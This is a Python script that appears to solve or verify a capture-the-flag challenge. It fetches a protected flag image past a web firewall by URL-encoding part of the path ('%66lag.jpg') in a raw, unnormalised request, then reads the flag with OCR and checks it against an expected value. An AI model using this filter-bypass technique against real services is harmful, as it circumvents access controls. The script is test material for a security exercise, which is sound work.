import os

SITE_URL = f"http://{os.environ['SERVICE_WAF_HTTP_HOST']}:{os.environ['SERVICE_WAF_HTTP_PORT']}"

import requests
from requests.models import PreparedRequest
from io import BytesIO
from PIL import Image
import pytesseract


class RawUrlPreparedRequest(PreparedRequest):
    def prepare_url(self, url, params):
        # Do not modify the URL
        self.url = url


def get_flag_image():
    print("Fetching flag image...")
    req = RawUrlPreparedRequest()
    req.prepare(method="GET", url=f"{SITE_URL}/public/%66lag.jpg")
    res = requests.Session().send(req)

    return res.content


def get_flag_text():
    image_data = get_flag_image()
    print("Image data fetched, processing...")
    image = Image.open(BytesIO(image_data)).convert("L")
    # The flag is rendered at a tiny font size to fit a 400x100px image, so
    # upscaling before OCR (same recovered image, just easier for tesseract
    # to read) substantially improves accuracy over running it on the raw
    # image directly.
    image = image.resize((image.width * 4, image.height * 4), Image.BICUBIC)
    return pytesseract.image_to_string(image, config="--psm 7").strip()


def normalize(s):
    # OCR of this tiny leetspeak font reliably confuses 0/O, 1/I/l and 4/a;
    # fold those together so a correct-but-imperfectly-OCR'd read still
    # matches the expected flag.
    s = s.lower()
    for a, b in (("o", "0"), ("i", "1"), ("l", "1"), ("a", "4")):
        s = s.replace(a, b)
    return s


flag_text = get_flag_text()
print(flag_text)

expected = os.environ.get("flag_main")
if expected and normalize(expected) in normalize(flag_text):
    print("MATCH")
else:
    print("NO MATCH")
    raise SystemExit(1)
